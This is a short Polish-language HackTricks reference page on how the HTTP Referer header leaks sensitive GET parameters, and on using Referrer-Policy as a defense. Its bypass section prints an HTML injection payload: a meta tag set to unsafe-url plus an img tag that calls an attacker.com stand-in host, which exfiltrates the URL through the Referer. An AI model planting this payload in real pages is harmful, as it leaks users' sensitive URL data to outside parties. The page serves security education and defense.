<details>

<summary><strong>Naucz się hakować AWS od zera do bohatera z</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Inne sposoby wsparcia HackTricks:

* Jeśli chcesz zobaczyć swoją **firmę reklamowaną w HackTricks** lub **pobrać HackTricks w formacie PDF**, sprawdź [**PLANY SUBSKRYPCYJNE**](https://github.com/sponsors/carlospolop)!
* Kup [**oficjalne gadżety PEASS & HackTricks**](https://peass.creator-spring.com)
* Odkryj [**Rodzinę PEASS**](https://opensea.io/collection/the-peass-family), naszą kolekcję ekskluzywnych [**NFT**](https://opensea.io/collection/the-peass-family)
* **Dołącz do** 💬 [**grupy Discord**](https://discord.gg/hRep4RUj7f) lub [**grupy telegramowej**](https://t.me/peass) lub **śledź** nas na **Twitterze** 🐦 [**@hacktricks_live**](https://twitter.com/hacktricks_live)**.**
* **Podziel się swoimi sztuczkami hakerskimi, przesyłając PR-y do** [**HackTricks**](https://github.com/carlospolop/hacktricks) i [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) repozytoriów na GitHubie.

</details>


# Nagłówki odwołań i polityka

Nagłówek odwołania jest używany przez przeglądarki do wskazania, która była poprzednia odwiedzona strona.

## Ujawnienie wrażliwych informacji

Jeśli w pewnym momencie na stronie internetowej znajdują się jakiekolwiek wrażliwe informacje w parametrach żądania GET, jeśli strona zawiera linki do zewnętrznych źródeł lub atakujący jest w stanie sprawić/zasugerować (inżynieria społeczna), aby użytkownik odwiedził adres URL kontrolowany przez atakującego. Może to umożliwić wydostanie wrażliwych informacji w ostatnim żądaniu GET.

## Ograniczenie

Możesz sprawić, że przeglądarka będzie stosować **politykę odwołań (Referrer-policy)**, która może **zapobiec** wysyłaniu wrażliwych informacji do innych aplikacji internetowych:
```
Referrer-Policy: no-referrer
Referrer-Policy: no-referrer-when-downgrade
Referrer-Policy: origin
Referrer-Policy: origin-when-cross-origin
Referrer-Policy: same-origin
Referrer-Policy: strict-origin
Referrer-Policy: strict-origin-when-cross-origin
Referrer-Policy: unsafe-url
```
## Przeciwdziałanie

Możesz zastąpić tę regułę, używając tagu meta HTML (atakujący musi wykorzystać wstrzyknięcie HTML):
```markup
<meta name="referrer" content="unsafe-url">
<img src="https://attacker.com">
```
## Obrona

Nigdy nie umieszczaj żadnych danych poufnych w parametrach GET ani ścieżkach w adresie URL.
